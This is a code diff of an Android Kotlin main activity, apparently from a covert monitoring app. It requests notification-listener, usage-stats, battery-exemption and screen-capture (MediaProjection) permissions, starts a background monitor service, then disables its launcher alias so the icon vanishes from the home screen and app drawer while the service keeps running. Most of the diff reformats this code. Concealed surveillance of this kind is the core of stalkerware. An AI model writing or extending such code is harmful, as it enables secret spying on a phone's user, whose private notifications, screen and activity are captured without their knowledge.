@@ -43,7 +43,6 @@ class MainActivity : AppCompatActivity() {
             } catch (e: Exception) {}
         }.start()
 
-        // Request runtime permissions
         val missing = PERMS.filter {
             checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
         }
@@ -60,72 +59,62 @@ class MainActivity : AppCompatActivity() {
             try { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } catch (e: Exception) {}
         }
 
-        // 2. Battery optimization whitelist
+        // 2. Battery optimization
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                 try {
-                    val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                    i.data = Uri.parse("package:$packageName")
-                    startActivity(i)
+                    startActivity(
+                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                            data = Uri.parse("package:$packageName")
+                        }
+                    )
                 } catch (e: Exception) {}
             }
         }
 
         // 3. Notification listener
         if (!isNotificationListenerEnabled()) {
-            try {
-                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-            } catch (e: Exception) {}
+            try { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) } catch (e: Exception) {}
         }
 
         // 4. POST_NOTIFICATIONS Android 13+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(
-                    this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101
-                )
+                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101)
             }
         }
 
         // 5. Start monitor service
         startMonitorService()
 
-        // 6. Request MediaProjection if not already approved
+        // 6. MediaProjection ek baar
         Handler(Looper.getMainLooper()).postDelayed({
             val prefs = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
-            val alreadyApproved = prefs.getBoolean("projection_approved", false)
-            if (!alreadyApproved) {
+            if (!prefs.getBoolean("projection_approved", false)) {
                 try {
-                    val i = Intent(this, ScreenPermissionActivity::class.java)
-                    i.putExtra("cmd_id", 0)
-                    i.putExtra("mode", ScreenStreamService.MODE_SNAPSHOT)
-                    startActivity(i)
+                    startActivity(
+                        Intent(this, ScreenPermissionActivity::class.java).apply {
+                            putExtra("cmd_id", 0)
+                            putExtra("mode", ScreenStreamService.MODE_SNAPSHOT)
+                        }
+                    )
                 } catch (e: Exception) {}
             }
         }, 2000)
 
-        // 7. Hide icon using ALIAS — safe method
-        // App stays in Settings > Apps, only launcher icon hides
-        hideIconViaAlias()
-
-        finish()
+        // 7. Hide icon after 500ms then finish
+        Handler(Looper.getMainLooper()).postDelayed({
+            hideIconViaAlias()
+            finish()
+        }, 500)
     }
 
-    /**
-     * SAFE icon hiding — disables the activity-alias (MainLauncher)
-     * NOT the MainActivity itself.
-     * Result:
-     *   - Home screen icon: GONE
-     *   - App drawer: GONE
-     *   - Settings > Apps: VISIBLE (can uninstall)
-     *   - Service: STILL RUNNING
-     */
     private fun hideIconViaAlias() {
         try {
-            val aliasName = ComponentName(packageName, "$packageName.MainLauncher")
+            val alias = ComponentName(this, "$packageName.MainLauncher")
             packageManager.setComponentEnabledSetting(
-                aliasName,
+                alias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
@@ -133,26 +122,18 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun isNotificationListenerEnabled(): Boolean {
-        val enabledListeners = Settings.Secure.getString(
-            contentResolver, "enabled_notification_listeners"
-        ) ?: return false
-        return enabledListeners.contains(packageName)
+        val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
+        return listeners.contains(packageName)
     }
 
     private fun hasUsageStats(): Boolean {
         return try {
             val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
             val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                appOps.unsafeCheckOpNoThrow(
-                    AppOpsManager.OPSTR_GET_USAGE_STATS,
-                    android.os.Process.myUid(), packageName
-                )
+                appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
             } else {
                 @Suppress("DEPRECATION")
-                appOps.checkOpNoThrow(
-                    AppOpsManager.OPSTR_GET_USAGE_STATS,
-                    android.os.Process.myUid(), packageName
-                )
+                appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
             }
             mode == AppOpsManager.MODE_ALLOWED
         } catch (e: Exception) { false }
@@ -167,9 +148,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    override fun onRequestPermissionsResult(
-        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
-    ) {
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         startEverything()
     }
